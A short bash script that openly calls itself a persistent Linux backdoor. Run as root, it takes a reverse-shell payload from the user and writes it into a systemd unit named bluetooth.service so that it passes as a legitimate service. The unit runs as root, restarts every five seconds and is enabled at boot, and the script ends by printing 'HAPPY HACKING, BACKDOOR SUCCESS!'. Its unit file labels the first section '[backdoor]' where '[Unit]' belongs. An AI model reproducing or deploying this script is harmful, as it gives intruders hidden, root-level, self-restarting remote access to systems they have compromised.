#!/usr/bin/env bash
# My Backdoor with systemd very simple and persistent

Ow0=clear

if [ $(/usr/bin/whoami) = "root" ]; then

	$Ow0
	echo "YOUR PAYLOAD FOR REVERSE SHELL"
	read -p "[+] " payload

	# CREATE A bluetooth.service FOR INIT IN SYSTEMD
	$Ow0
	echo "[backdoor]" > /etc/systemd/system/bluetooth.service
	echo "Description=Backdoor_for_linux" >> /etc/systemd/system/bluetooth.service
	echo "" >> /etc/systemd/system/bluetooth.service
	echo "[Service]" >> /etc/systemd/system/bluetooth.service
	echo "User=root" >> /etc/systemd/system/bluetooth.service
	echo "Group=root" >> /etc/systemd/system/bluetooth.service
	echo "WorkingDirectory=/root" >> /etc/systemd/system/bluetooth.service
	echo "ExecStart= $payload" >> /etc/systemd/system/bluetooth.service
	echo "Restart=always" >> /etc/systemd/system/bluetooth.service
	echo "RestartSec=5" >> /etc/systemd/system/bluetooth.service
	echo "" >> /etc/systemd/system/bluetooth.service
	echo "[Install]" >> /etc/systemd/system/bluetooth.service
	echo "WantedBy=multi-user.target" >> /etc/systemd/system/bluetooth.service

	#INIT SERVICE BACKDOOR
	systemctl start bluetooth.service && systemctl enable bluetooth.service

	echo "[+] COMPLETED HAPPY HACKING, BACKDOOR SUCCESS!"

else
	echo "You not root, run with root --> sudo bash darksec.sh"
fi
